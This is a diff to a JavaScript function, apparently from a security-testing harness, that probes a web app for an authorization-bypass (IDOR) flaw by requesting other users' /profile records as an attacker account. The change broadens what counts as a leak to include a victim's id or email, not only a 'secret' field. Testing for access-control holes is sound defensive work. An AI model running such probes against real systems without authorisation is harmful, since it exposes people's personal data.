@@ -46,20 +46,34 @@ async function runAuthBypassAttack({ baseUrl }) {
         validateStatus: () => true,
       });
 
-      if (res.status === 200 && res.data && typeof res.data === 'object' && 'secret' in res.data) {
-        return {
-          vulnerability: 'auth-bypass',
-          exploited: true,
-          payload: `GET /profile/${victim} as ${ATTACKER}`,
-          evidence: truncate(`Leaked secret from ${victim}: ${res.data.secret}`),
-          durationMs: Date.now() - start,
-        };
+      // Any 200 with the victim's data is a leak — even a partial response
+      // (e.g. secret stripped but name/email still leaking) is still IDOR.
+      if (res.status === 200 && res.data && typeof res.data === 'object') {
+        const looksLikeVictim =
+          res.data.id === victim ||
+          (typeof res.data.email === 'string' && res.data.email.includes(victim.split('-')[1] || victim)) ||
+          'secret' in res.data;
+        if (looksLikeVictim) {
+          const leakedField =
+            'secret' in res.data
+              ? `secret=${res.data.secret}`
+              : res.data.email
+                ? `email=${res.data.email}`
+                : `id=${res.data.id}`;
+          return {
+            vulnerability: 'auth-bypass',
+            exploited: true,
+            payload: `GET /profile/${victim} as ${ATTACKER}`,
+            evidence: truncate(`Leaked from ${victim}: ${leakedField}`),
+            durationMs: Date.now() - start,
+          };
+        }
       }
 
       if (res.status === 403) {
         tried.push(`GET /profile/${victim}: 403 Forbidden`);
       } else {
-        tried.push(`GET /profile/${victim}: ${res.status} (no secret leaked)`);
+        tried.push(`GET /profile/${victim}: ${res.status} (no leak)`);
       }
     } catch (err) {
       tried.push(`GET /profile/${victim}: ${err.message}`);
